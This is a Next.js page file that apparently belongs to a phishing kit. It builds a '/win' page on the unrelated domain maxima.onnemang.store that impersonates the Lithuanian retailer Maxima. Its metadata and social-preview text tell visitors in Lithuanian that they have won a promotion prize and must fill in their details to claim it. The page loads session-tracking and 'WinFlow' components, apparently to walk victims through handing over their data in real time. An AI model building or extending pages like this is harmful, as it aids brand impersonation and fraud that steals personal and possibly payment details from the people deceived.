import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { WinFlow } from "@/components/demo/WinFlow";
import { resolveServerSessionIdentity } from "@/lib/session-id";

export const dynamic = "force-dynamic";

const SITE_URL = "https://maxima.onnemang.store";
const OG_IMAGE_ABSOLUTE = `${SITE_URL}/og-image.jpg`;

export const metadata = {
  title: "Maxima — Jūs laimėjote!",
  description:
    "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
  icons: {
    icon: "/favicon.ico",
  },
  robots: {
    index: true,
    follow: true,
    googleBot: {
      index: true,
      follow: true,
      "max-image-preview": "large",
      "max-snippet": -1,
    },
  },
  metadataBase: new URL(SITE_URL),
  alternates: {
    canonical: "/win",
  },
  openGraph: {
    type: "website",
    determiner: "auto",
    locale: "lt_LT",
    localeAlternate: ["en_US", "pl_PL", "ru_RU"],
    url: SITE_URL,
    siteName: "Maxima Laimės Ratas",
    title: "Maxima — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    images: [
      {
        url: OG_IMAGE_ABSOLUTE,
        secureUrl: OG_IMAGE_ABSOLUTE,
        width: 1254,
        height: 1254,
        alt: "Maxima Laimės Ratas",
        type: "image/jpeg",
      },
    ],
  },
  twitter: {
    card: "summary_large_image",
    site: SITE_URL,
    title: "Maxima — Jūs laimėjote!",
    description:
      "Sveikiname! Jūs laimėjote Maxima akcijos prizą. Užpildykite duomenis ir gaukite savo prizą.",
    images: [OG_IMAGE_ABSOLUTE],
  },
  appLinks: {
    web: {
      url: SITE_URL,
      should_fallback: true,
    },
  },
};

type Props = {
  searchParams: Promise<{ session?: string }>;
};

export default async function WinPage({ searchParams }: Props) {
  const { sessionId, routeSessionId } = await resolveServerSessionIdentity({
    searchParams: await searchParams,
  });

  return (
    <>
      <SessionRealtimeGate sessionId={sessionId ?? ""} routeSessionId={routeSessionId ?? undefined} />
      <WinFlow sessionId={sessionId} routeSessionId={routeSessionId} />
    </>
  );
}
